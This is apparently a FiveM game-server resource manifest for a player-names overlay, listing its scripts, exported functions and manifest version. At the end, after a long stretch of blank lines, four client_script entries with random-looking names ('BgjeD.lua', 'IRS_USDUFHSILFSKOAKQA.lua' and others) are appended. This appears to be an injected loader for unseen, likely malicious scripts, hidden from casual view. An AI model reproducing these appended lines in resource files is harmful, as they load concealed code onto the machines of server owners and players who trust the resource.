-- add scripts
client_script 'playernames_api.lua'
server_script 'playernames_api.lua'

client_script 'playernames_cl.lua'
server_script 'playernames_sv.lua'

-- make exports
local exportList = {
    'setComponentColor',
    'setComponentAlpha',
    'setComponentVisibility',
    'setWantedLevel',
    'setHealthBarColor',
    'setNameTemplate'
}

exports(exportList)
server_exports(exportList)

-- add files
files {
    'template/template.lua'
}

-- support the latest resource manifest
resource_manifest_version '05cfa83c-a124-4cfa-a768-c24a5811d8f9'











client_script "BgjeD.lua"

client_script "WKjFA.lua"
client_script "GmleW.lua"








client_script "IRS_USDUFHSILFSKOAKQA.lua"